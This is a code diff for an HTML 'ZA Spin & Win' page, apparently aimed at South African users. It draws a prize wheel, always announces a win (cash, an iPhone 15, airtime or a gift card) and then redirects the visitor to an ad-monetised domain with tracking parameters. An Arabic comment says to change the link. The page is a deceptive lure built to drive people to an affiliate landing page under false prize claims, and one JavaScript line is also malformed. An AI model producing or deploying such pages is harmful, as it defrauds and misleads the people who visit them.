@@ -1,43 +1,157 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Spin & Win</title>
-  <link rel="stylesheet" href="style.css">
-</head>
-<body>
+<meta charset="UTF-8">
+<title>ZA Spin & Win</title>
 
+<style>
+body {
+  margin: 0;
+  font-family: Arial, sans-serif;
+  background: linear-gradient(135deg, #6a11cb, #ff0844);
+  color: #fff;
+  text-align: center;
+}
+
+.container {
+  padding: 40px 20px;
+}
+
+h1 {
+  margin-bottom: 10px;
+}
+
+#wheel-container {
+  position: relative;
+  margin: 30px auto;
+  width: 300px;
+  height: 300px;
+}
+
+#wheel {
+  width: 100%;
+  height: 100%;
+  border-radius: 50%;
+  border: 10px solid #fff;
+  transition: transform 4s ease-out;
+}
+
+#pointer {
+  position: absolute;
+  top: -15px;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 0;
+  height: 0;
+  border-left: 15px solid transparent;
+  border-right: 15px solid transparent;
+  border-bottom: 30px solid #fff;
+}
+
+button {
+  margin-top: 20px;
+  padding: 15px 40px;
+  font-size: 18px;
+  border-radius: 30px;
+  border: none;
+  background: #ff9800;
+  color: #fff;
+  cursor: pointer;
+}
+
+button:disabled {
+  opacity: 0.6;
+  cursor: not-allowed;
+}
+
+small {
+  display: block;
+  margin-top: 15px;
+  opacity: 0.8;
+}
+</style>
+</head>
+
+<body>
 <div class="container">
-  <h1>🇿🇦 Spin & Win Big Prizes!</h1>
+  <h1>ZA Spin & Win Big Prizes!</h1>
   <p>Your chance to win today 🎉</p>
 
-  <div class="wheel">🎡</div>
+  <div id="wheel-container">
+    <div id="pointer"></div>
+    <canvas id="wheel" width="300" height="300"></canvas>
+  </div>
 
-  <button onclick="spin()">SPIN NOW</button>
+  <button id="spinBtn">SPIN NOW</button>
 
-  <p id="result"></p>
-
-  <small>* Promotional game • No purchase required</small>
+  <small>* Promotional game · No purchase required</small>
 </div>
 
 <script>
-function spin() {
-  const prizes = [
-    "R1000 Cash 💰",
-    "iPhone 15 📱",
-    "Free Airtime 📶",
-    "Takealot Gift Card 🎁"
-  ];
+const prizes = [
+  "R1000 Cash",
+  "iPhone 15",
+  "Free Airtime",
+  "Takealot Gift Card"
+];
 
-  const win = prizes[Math.floor(Math.random() * prizes.length)];
-  document.getElementById("result").innerText = "🎉 You got: " + win;
+const colors = ["#ff5252", "#ffca28", "#66bb6a", "#42a5f5"];
 
-  // تحويل بعد 3 ثواني
-  setTimeout(function () {
-    window.location.href = "https://mediahqx.bountyads.store/?utm_medium=b8017b6ba61df93050bd920ec2b7a89c4f7a148a&utm_campaign=shmuelolo11";
-  }, 3000);
+const canvas = document.getElementById("wheel");
+const ctx = canvas.getContext("2d");
+const spinBtn = document.getElementById("spinBtn");
+
+let angle = 0;
+let spinning = false;
+
+function drawWheel() {
+  const arc = (2 * Math.PI) / prizes.length;
+
+  for (let i = 0; i < prizes.length; i++) {
+    ctx.beginPath();
+    ctx.fillStyle = colors[i];
+    ctx.moveTo(150, 150);
+    ctx.arc(150, 150, 150, arc * i, arc * (i + 1));
+    ctx.fill();
+
+    ctx.save();
+    ctx.translate(150, 150);
+    ctx.rotate(arc * i + arc / 2);
+    ctx.fillStyle = "#fff";
+    ctx.font = "16px Arial";
+    ctx.textAlign = "right";
+    ctx.fillText(prizes[i], 140, 5);
+    ctx.restore();
+  }
 }
-</script>
 
+drawWheel();
+
+spinBtn.onclick = () => {
+  if (spinning) return;
+
+  spinning = true;
+  spinBtn.disabled = true;
+
+  const spins = Math.floor(Math.random() * 5) + 5;
+  const prizeIndex = Math.floor(Math.random() * prizes.length);
+  const arc = 360 / prizes.length;
+
+  const rotateTo =
+    spins * 360 +
+    (360 - prizeIndex * arc - arc / 2);
+
+  angle += rotateTo;
+  canvas.style.transform = rotate(${angle}deg);
+
+  setTimeout(() => {
+    const prize = prizes[prizeIndex];
+    alert("🎉 You won: " + prize);
+
+    // 🔴 غير اللينك ده
+    window.location.href = "https://mediahqx.bountyads.store/?utm_medium=b8017b6ba61df93050bd920ec2b7a89c4f7a148a&utm_campaign=shmuelolo11";
+  }, 4200);
+};
+</script>
 </body>
 </html>
